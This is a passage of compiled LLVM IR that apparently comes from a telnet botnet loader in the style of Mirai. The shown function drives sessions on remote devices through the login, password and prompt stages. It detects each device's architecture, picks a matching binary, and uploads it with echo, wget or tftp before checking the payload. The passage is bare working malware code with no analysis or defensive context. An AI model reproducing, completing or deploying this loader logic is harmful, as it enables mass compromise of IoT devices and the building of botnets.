  store i32 14, i32* %665, align 8
  %666 = load %struct.connection*, %struct.connection** %6, align 8
  %667 = getelementptr inbounds %struct.connection, %struct.connection* %666, i32 0, i32 13
  store i16 45, i16* %667, align 2
  %668 = load %struct.connection*, %struct.connection** %6, align 8
  %669 = getelementptr inbounds %struct.connection, %struct.connection* %668, i32 0, i32 4
  %670 = load i32, i32* %669, align 8
  %671 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %670, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.22, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.24, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0))
  %672 = load %struct.connection*, %struct.connection** %6, align 8
  %673 = getelementptr inbounds %struct.connection, %struct.connection* %672, i32 0, i32 4
  %674 = load i32, i32* %673, align 8
  %675 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %674, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.41, i64 0, i64 0))
  %676 = load %struct.connection*, %struct.connection** %6, align 8
  %677 = getelementptr inbounds %struct.connection, %struct.connection* %676, i32 0, i32 4
  %678 = load i32, i32* %677, align 8
  %679 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %678, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.25, i64 0, i64 0))
  br label %767

680:                                              ; preds = %652, %646
  %681 = load %struct.connection*, %struct.connection** %6, align 8
  %682 = getelementptr inbounds %struct.connection, %struct.connection* %681, i32 0, i32 16
  %683 = load i8, i8* %682, align 2
  %684 = icmp ne i8 %683, 0
  br i1 %684, label %744, label %685

685:                                              ; preds = %680
  %686 = load %struct.connection*, %struct.connection** %6, align 8
  %687 = getelementptr inbounds %struct.connection, %struct.connection* %686, i32 0, i32 3
  %688 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %687, i32 0, i32 2
  %689 = getelementptr inbounds [6 x i8], [6 x i8]* %688, i64 0, i64 0
  %690 = call i32 @strncmp(i8* %689, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i64 0, i64 0), i64 3) #10
  %691 = icmp eq i32 %690, 0
  br i1 %691, label %692, label %744

692:                                              ; preds = %685
  %693 = load %struct.connection*, %struct.connection** %6, align 8
  %694 = getelementptr inbounds %struct.connection, %struct.connection* %693, i32 0, i32 5
  store i32 0, i32* %694, align 4
  %695 = load %struct.connection*, %struct.connection** %6, align 8
  %696 = getelementptr inbounds %struct.connection, %struct.connection* %695, i32 0, i32 6
  store i32 0, i32* %696, align 8
  %697 = load %struct.connection*, %struct.connection** %6, align 8
  %698 = getelementptr inbounds %struct.connection, %struct.connection* %697, i32 0, i32 7
  store i32 0, i32* %698, align 4
  %699 = load %struct.connection*, %struct.connection** %6, align 8
  %700 = getelementptr inbounds %struct.connection, %struct.connection* %699, i32 0, i32 8
  store i32 0, i32* %700, align 8
  %701 = load %struct.connection*, %struct.connection** %6, align 8
  %702 = getelementptr inbounds %struct.connection, %struct.connection* %701, i32 0, i32 3
  %703 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %702, i32 0, i32 2
  %704 = getelementptr inbounds [6 x i8], [6 x i8]* %703, i64 0, i64 0
  %705 = load %struct.connection*, %struct.connection** %6, align 8
  %706 = getelementptr inbounds %struct.connection, %struct.connection* %705, i32 0, i32 3
  %707 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %706, i32 0, i32 2
  %708 = getelementptr inbounds [6 x i8], [6 x i8]* %707, i64 0, i64 3
  %709 = load i8, i8* %708, align 1
  %710 = sext i8 %709 to i32
  %711 = icmp eq i32 %710, 0
  %712 = zext i1 %711 to i64
  %713 = select i1 %711, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i64 0, i64 0)
  %714 = call i8* @strcpy(i8* %704, i8* %713) #8
  %715 = load %struct.connection*, %struct.connection** %6, align 8
  %716 = getelementptr inbounds %struct.connection, %struct.connection* %715, i32 0, i32 3
  %717 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %716, i32 0, i32 2
  %718 = getelementptr inbounds [6 x i8], [6 x i8]* %717, i64 0, i64 0
  %719 = load %struct.connection*, %struct.connection** %6, align 8
  %720 = getelementptr inbounds %struct.connection, %struct.connection* %719, i32 0, i32 3
  %721 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %720, i32 0, i32 2
  %722 = getelementptr inbounds [6 x i8], [6 x i8]* %721, i64 0, i64 0
  %723 = call i64 @strlen(i8* %722) #10
  %724 = trunc i64 %723 to i32
  %725 = call %struct.binary* @binary_get_by_arch(i8* %718, i32 %724)
  %726 = load %struct.connection*, %struct.connection** %6, align 8
  %727 = getelementptr inbounds %struct.connection, %struct.connection* %726, i32 0, i32 2
  store %struct.binary* %725, %struct.binary** %727, align 8
  %728 = load %struct.connection*, %struct.connection** %6, align 8
  %729 = getelementptr inbounds %struct.connection, %struct.connection* %728, i32 0, i32 4
  %730 = load i32, i32* %729, align 8
  %731 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %730, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.22, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.24, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0))
  %732 = load %struct.connection*, %struct.connection** %6, align 8
  %733 = getelementptr inbounds %struct.connection, %struct.connection* %732, i32 0, i32 4
  %734 = load i32, i32* %733, align 8
  %735 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %734, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.25, i64 0, i64 0))
  %736 = load %struct.connection*, %struct.connection** %6, align 8
  %737 = getelementptr inbounds %struct.connection, %struct.connection* %736, i32 0, i32 4
  %738 = load i32, i32* %737, align 8
  %739 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %738, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.28, i64 0, i64 0))
  %740 = load %struct.connection*, %struct.connection** %6, align 8
  %741 = getelementptr inbounds %struct.connection, %struct.connection* %740, i32 0, i32 10
  store i32 13, i32* %741, align 8
  %742 = load %struct.connection*, %struct.connection** %6, align 8
  %743 = getelementptr inbounds %struct.connection, %struct.connection* %742, i32 0, i32 16
  store i8 1, i8* %743, align 2
  br label %767

744:                                              ; preds = %685, %680
  br label %745

745:                                              ; preds = %744
  br label %746

746:                                              ; preds = %745, %641
  %747 = load %struct.connection*, %struct.connection** %6, align 8
  %748 = getelementptr inbounds %struct.connection, %struct.connection* %747, i32 0, i32 4
  %749 = load i32, i32* %748, align 8
  %750 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %749, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.43, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.24, i64 0, i64 0))
  %751 = load %struct.connection*, %struct.connection** %6, align 8
  %752 = getelementptr inbounds %struct.connection, %struct.connection* %751, i32 0, i32 10
  store i32 18, i32* %752, align 8
  %753 = load %struct.connection*, %struct.connection** %6, align 8
  %754 = getelementptr inbounds %struct.connection, %struct.connection* %753, i32 0, i32 13
  store i16 45, i16* %754, align 2
  br label %755

755:                                              ; preds = %746, %634
  br label %767

756:                                              ; preds = %180
  %757 = load %struct.connection*, %struct.connection** %6, align 8
  %758 = call i32 @connection_consume_cleanup(%struct.connection* %757)
  store i32 %758, i32* %11, align 4
  %759 = icmp sgt i32 %758, 0
  br i1 %759, label %760, label %765

760:                                              ; preds = %756
  %761 = load %struct.connection*, %struct.connection** %6, align 8
  %762 = getelementptr inbounds %struct.connection, %struct.connection* %761, i32 0, i32 4
  %763 = load i32, i32* %762, align 8
  store i32 %763, i32* %13, align 4
  %764 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %764)
  br label %765

765:                                              ; preds = %760, %756
  br label %766

766:                                              ; preds = %180, %765
  store i32 0, i32* %11, align 4
  br label %767

767:                                              ; preds = %766, %755, %692, %657, %633, %579, %525, %487, %424, %393, %345, %298, %277, %248, %220, %192
  %768 = load i32, i32* %11, align 4
  %769 = icmp eq i32 %768, 0
  br i1 %769, label %770, label %771

770:                                              ; preds = %767
  br label %819

771:                                              ; preds = %767
  %772 = load i32, i32* %11, align 4
  %773 = load %struct.connection*, %struct.connection** %6, align 8
  %774 = getelementptr inbounds %struct.connection, %struct.connection* %773, i32 0, i32 12
  %775 = load i16, i16* %774, align 8
  %776 = zext i16 %775 to i32
  %777 = icmp sgt i32 %772, %776
  br i1 %777, label %778, label %783

778:                                              ; preds = %771
  %779 = load %struct.connection*, %struct.connection** %6, align 8
  %780 = getelementptr inbounds %struct.connection, %struct.connection* %779, i32 0, i32 12
  %781 = load i16, i16* %780, align 8
  %782 = zext i16 %781 to i32
  store i32 %782, i32* %11, align 4
  br label %783

783:                                              ; preds = %778, %771
  %784 = load i32, i32* %11, align 4
  %785 = load %struct.connection*, %struct.connection** %6, align 8
  %786 = getelementptr inbounds %struct.connection, %struct.connection* %785, i32 0, i32 12
  %787 = load i16, i16* %786, align 8
  %788 = zext i16 %787 to i32
  %789 = sub nsw i32 %788, %784
  %790 = trunc i32 %789 to i16
  store i16 %790, i16* %786, align 8
  %791 = load %struct.connection*, %struct.connection** %6, align 8
  %792 = getelementptr inbounds %struct.connection, %struct.connection* %791, i32 0, i32 18
  %793 = getelementptr inbounds [8192 x i8], [8192 x i8]* %792, i64 0, i64 0
  %794 = load %struct.connection*, %struct.connection** %6, align 8
  %795 = getelementptr inbounds %struct.connection, %struct.connection* %794, i32 0, i32 18
  %796 = getelementptr inbounds [8192 x i8], [8192 x i8]* %795, i64 0, i64 0
  %797 = load i32, i32* %11, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds i8, i8* %796, i64 %798
  %800 = load %struct.connection*, %struct.connection** %6, align 8
  %801 = getelementptr inbounds %struct.connection, %struct.connection* %800, i32 0, i32 12
  %802 = load i16, i16* %801, align 8
  %803 = zext i16 %802 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %793, i8* align 1 %799, i64 %803, i1 false)
  %804 = load %struct.connection*, %struct.connection** %6, align 8
  %805 = getelementptr inbounds %struct.connection, %struct.connection* %804, i32 0, i32 18
  %806 = load %struct.connection*, %struct.connection** %6, align 8
  %807 = getelementptr inbounds %struct.connection, %struct.connection* %806, i32 0, i32 12
  %808 = load i16, i16* %807, align 8
  %809 = zext i16 %808 to i64
  %810 = getelementptr inbounds [8192 x i8], [8192 x i8]* %805, i64 0, i64 %809
  store i8 0, i8* %810, align 1
  br label %811

811:                                              ; preds = %783
  %812 = load %struct.connection*, %struct.connection** %6, align 8
  %813 = getelementptr inbounds %struct.connection, %struct.connection* %812, i32 0, i32 12
  %814 = load i16, i16* %813, align 8
  %815 = zext i16 %814 to i32
  %816 = icmp sgt i32 %815, 8196
  br i1 %816, label %817, label %818

817:                                              ; preds = %811
  call void @abort() #9
  unreachable

818:                                              ; preds = %811
  br label %180

819:                                              ; preds = %770
  br label %129

820:                                              ; preds = %161
  br label %821

821:                                              ; preds = %30, %65, %87, %820, %119, %113
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i64 @pthread_self() #6

; Function Attrs: nounwind
declare i32 @pthread_setaffinity_np(i64, i64, %struct.cpu_set_t*) #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noreturn nounwind
declare void @abort() #2

declare i32 @connection_consume_iacs(%struct.connection*) #3

declare i32 @connection_consume_login_prompt(%struct.connection*) #3

declare signext i8 @util_sockprintf(i32, i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

declare i32 @connection_consume_password_prompt(%struct.connection*) #3

declare i32 @connection_consume_prompt(%struct.connection*) #3

declare i32 @connection_consume_copy_op(%struct.connection*) #3

declare i32 @connection_consume_arch(%struct.connection*) #3

declare %struct.binary* @binary_get_by_arch(i8*, i32) #3

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #7

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #7

declare i32 @connection_consume_arm_subtype(%struct.connection*) #3

declare i32 @connection_consume_upload_methods(%struct.connection*) #3

declare i32 @connection_upload_echo(%struct.connection*) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @strncmp(i8*, i8*, i64) #7

declare i32 @connection_upload_wget(%struct.connection*) #3

declare i32 @connection_upload_tftp(%struct.connection*) #3

declare i32 @connection_verify_payload(%struct.connection*) #3

declare i32 @connection_consume_cleanup(%struct.connection*) #3

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #5

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { argmemonly nofree nounwind willreturn }
attributes #6 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nounwind }
attributes #9 = { noreturn nounwind }
attributes #10 = { nounwind readonly willreturn }
attributes #11 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
